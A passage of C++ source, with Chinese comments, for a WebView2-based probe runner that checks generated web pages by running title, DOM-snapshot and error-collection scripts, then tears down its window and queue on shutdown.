                [c, demoId](HRESULT r, LPCWSTR json) -> HRESULT {
                    c->demoPending = false;
                    if (SUCCEEDED(r) && json) {
                        Json v;
                        if (exec_result_json(json, v) && v.is_object()
                            && v.contains("groups") && v["groups"].is_array()) {
                            /* 每个 group 挂上它属于哪个演示：一个演示可能有多组 checks，
                               只按顺序配会在"前一个演示有 2 组"时把后一条配错演示。 */
                            for (const Json& g : v["groups"]) {
                                Json gg = g;
                                gg["demo"] = demoId;
                                c->demoGroups.push_back(std::move(gg));
                            }
                            log_info("[verify] demo 核对脚本返回 " + std::to_string(v["groups"].size()) + " 组");
                        } else {
                            log_warn("[verify] demo 核对脚本的结果看不懂：" + truncate(to_utf8(json)));
                            Json bad = Json::object();
                            bad["index"] = 0;
                            bad["misses"] = Json::array({"演示核对脚本的结果看不懂"});
                            bad["read"] = Json::array();
                            bad["demo"] = demoId;
                            c->demoGroups.push_back(std::move(bad));
                        }
                    } else {
                        log_warn("[verify] demo 核对脚本没有返回结果");
                        /* 必须变成一条 miss：否则"某个演示没核对成功"会被 total 统计漏掉，
                           报告显示"核对了 N 个读数，全部一致"（N 只数了别的演示）。 */
                        Json bad = Json::object();
                        bad["index"] = 0;
                        bad["misses"] = Json::array({"演示核对脚本没有返回结果（ExecuteScript 失败）"});
                        bad["read"] = Json::array();
                        bad["demo"] = demoId;
                        c->demoGroups.push_back(std::move(bad));
                    }
                    c->demoIndex++;
                    return S_OK;
                }).Get());
        return;
    }

    /* ---- 探针：title → DOM 快照 → 探针错误 ---- */
    if (!core_->haveTitle) {
        if (core_->pollPending) return;
        if (core_->lastPollMs != 0 && now - core_->lastPollMs < kPollMs) return;
        core_->pollPending = true;
        core_->lastPollMs = now;
        std::shared_ptr<Core> c = core_;
        core_->webview->ExecuteScript(
            L"document.title",
            Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
                [c](HRESULT r, LPCWSTR json) -> HRESULT {
                    c->pollPending = false;
                    if (SUCCEEDED(r) && json) {
                        Json v;
                        if (exec_result_json(json, v) && v.is_string()) {
                            c->title = v.get<std::string>();
                        }
                    }
                    bool ready = !c->title.empty();
                    if (ready && c->mSync && c->title.rfind("【探针】", 0) != 0) ready = false;
                    if (ready && c->mAsync && c->title.find("【异步") == std::string::npos) ready = false;
                    if (ready && c->mDemo && c->title.find("【演示探针】") == std::string::npos) ready = false;
                    if (ready && c->mPet && c->title.find("【陪练·") == std::string::npos) ready = false;
                    c->haveTitle = ready;
                    return S_OK;
                }).Get());
        return;
    }
    if (!core_->haveFacts) {
        if (core_->factsPending) return;
        core_->factsPending = true;
        log_info("[verify] 发 DOM 快照脚本");
        std::shared_ptr<Core> c = core_;
        core_->webview->ExecuteScript(
            to_wide(kDomFactsJs).c_str(),
            Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
                [c](HRESULT r, LPCWSTR json) -> HRESULT {
                    c->factsPending = false;
                    c->haveFacts = true;
                    if (SUCCEEDED(r) && json) {
                        Json v;
                        if (exec_result_json(json, v)) {
                            c->facts = std::move(v);
                            if (c->facts.is_object() && c->facts.contains("error")) {
                                log_warn("[verify] DOM 快照脚本自己抛错：" + truncate(json_dump(c->facts, -1)));
                            }
                        } else {
                            log_warn("[verify] DOM 快照解析失败，原文：" + truncate(to_utf8(json)));
                        }
                    } else {
                        log_warn("[verify] DOM 快照脚本没有返回结果");
                    }
                    return S_OK;
                }).Get());
        return;
    }
    if (!core_->haveErrs) {
        if (core_->errsPending) return;
        core_->errsPending = true;
        std::shared_ptr<Core> c = core_;
        core_->webview->ExecuteScript(
            to_wide(kErrorsJs).c_str(),
            Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
                [c](HRESULT r, LPCWSTR json) -> HRESULT {
                    c->errsPending = false;
                    c->haveErrs = true;
                    if (SUCCEEDED(r) && json) {
                        Json v;
                        if (exec_result_json(json, v) && v.is_object()) {
                            if (v.contains("probe") && v["probe"].is_array()) c->probeErrs = v["probe"];
                            if (v.contains("console") && v["console"].is_array()) c->consoleErrs = v["console"];
                        }
                    }
                    return S_OK;
                }).Get());
        return;
    }

    Json raw = Json::object();
    raw["title"] = core_->title;
    Json names = Json::array();
    for (const std::string& n : a.req.probes) names.push_back(n);
    raw["probeNames"] = std::move(names);
    Json markers = Json::object();
    markers["sync"] = core_->mSync;
    markers["async"] = core_->mAsync;
    markers["demo"] = core_->mDemo;
    markers["pet"] = core_->mPet;
    raw["markers"] = std::move(markers);
    raw["domFacts"] = core_->facts;
    raw["probeErrs"] = core_->probeErrs;
    raw["consoleErrors"] = core_->consoleErrs;
    Json warns = Json::array();
    for (const auto& w : core_->warnings) warns.push_back(w);
    raw["warnings"] = std::move(warns);
    raw["durationMs"] = now - core_->startMs;
    raw["timedOut"] = core_->timedOut;
    raw["cancelled"] = false;
    FinishRun(a, true, std::move(raw), std::string());
}

void ProbeRunner::DestroyWindowAndEnv() {
    if (!core_) return;
    ++core_->gen;                  // 在途回调从此不再认自己那一代
    core_->envCreating = false;
    core_->ctrlCreating = false;
    core_->collectorPending = false;
    core_->processFailed = false;
    if (core_->webview) {
        if (core_->navStartHooked) { core_->webview->remove_NavigationStarting(core_->navStartTok); core_->navStartHooked = false; }
        if (core_->frameNavHooked) { core_->webview->remove_FrameNavigationStarting(core_->frameNavTok); core_->frameNavHooked = false; }
        if (core_->navDoneHooked) { core_->webview->remove_NavigationCompleted(core_->navDoneTok); core_->navDoneHooked = false; }
        if (core_->newWinHooked) { core_->webview->remove_NewWindowRequested(core_->newWinTok); core_->newWinHooked = false; }
        if (core_->procFailHooked) { core_->webview->remove_ProcessFailed(core_->procFailTok); core_->procFailHooked = false; }
    }
    if (core_->controller) {
        core_->controller->Close();
        core_->controller.Reset();
    }
    core_->webview.Reset();
    core_->env.Reset();
    core_->envReady = false;
    core_->ctrlReady = false;
    core_->collectorReady = false;
    core_->loaded = false;
    core_->navigating = false;
    if (core_->hwnd) {
        ::DestroyWindow(core_->hwnd);
        core_->hwnd = nullptr;
    }
    if (core_->classRegistered) {
        ::UnregisterClassW(kVerifyClass, hInst_);
        core_->classRegistered = false;
    }
}

void ProbeRunner::Shutdown() {
    if (!core_) return;
    core_->alive = false;
    while (!queue_.empty()) {
        auto item = std::move(queue_.front());
        queue_.pop_front();
        if (item.second) item.second(false, Json(), "校验服务已关闭");
    }
    if (active_) {
        if (!active_->done) {
            active_->done = true;
            if (active_->cb) active_->cb(false, Json(), "校验被中断（应用正在退出）");
        }
        active_.reset();
    }
    core_->active.reset();
    /* 在途校验的探针副本必须在这里删：DriveFinalize 不会再跑了。
       （只删我们自己写的副本；demo 加载的原页面由 ownsProbeCopy 保护。） */
    DeleteProbeCopy();
    DestroyWindowAndEnv();
    core_.reset();
}

}  // namespace isg
